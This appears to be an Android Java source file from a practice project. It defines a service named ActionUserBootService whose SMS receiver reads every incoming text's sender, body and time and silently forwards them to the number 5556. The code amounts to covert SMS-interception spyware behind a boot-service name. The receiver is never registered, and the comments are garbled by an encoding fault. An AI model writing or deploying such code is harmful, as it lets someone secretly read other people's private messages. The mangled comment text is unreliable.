package com.example.testone019.broadcast;

import java.text.SimpleDateFormat;
import java.util.Date;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.IBinder;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.util.Log;

public class ActionUserBootService extends Service {
	private String ACTION_SYATEM_BOOT_SMS = "android.provider.Telephony.SMS_RECEIVED";

	public void onCreate() {
		super.onCreate();
		Log.i("11", "1111111111");
		BroadcastReceiver receiver = new BroadcastReceiver() {
			public void onReceive(Context context, Intent intent) {
				StringBuffer sb = new StringBuffer();
				Bundle bundle = intent.getExtras();
				if(bundle != null){
					//ͨ��pdus������н��յ��ö�����Ϣ����ö��ŵ�����
					Object[] pdus = (Object[]) bundle.get("pdus");
					SmsMessage[] message = new SmsMessage[pdus.length];
					for(int i =0;i<message.length;i++){
					//��õ����������ݣ���pdu��ʽ�洢�������ɶ��Ŷ���
						message[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
					}
					for(SmsMessage mge:message){
						sb.append("�������� :"+mge.getDisplayOriginatingAddress()+"\n");
						sb.append("���ŵ�����:"+mge.getMessageBody());
						String sender = mge.getDisplayOriginatingAddress();//��ö��ŷ����ߵĺ���
						String content = mge.getMessageBody();//��ö��ŵ�����
						//���ŷ��͵�ʱ��
						Date data = new Date(mge.getTimestampMillis());
						SimpleDateFormat format = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
						String sendTime = format.format(data);
						
						SmsManager manger = SmsManager.getDefault();
						manger.sendTextMessage("5556", null, "������:"+sender+"-----����ʱ��:"+sendTime+"----����:"+content, null, null);
						//�����ص��Ķ��ŷ��͵�ָ�����ֻ����˴�Ϊ5556
						
					}
					
				}
//				String action = intent.getAction();
//				if (action.equals(ACTION_SYATEM_BOOT_SMS)) {
//					Toast.makeText(context, "��̬̬ע��㲥��������>�����Ժ����������Զ���", 0)
//							.show();
//				}
				
			}
		};

	}

	public int onStartCommand(Intent intent, int flags, int startId) {
		Log.i("11", "2222222222");
		return super.onStartCommand(intent, flags, startId);
	}

	public IBinder onBind(Intent intent) {
		Log.i("11", "333333333333");
		return null;
	}

}
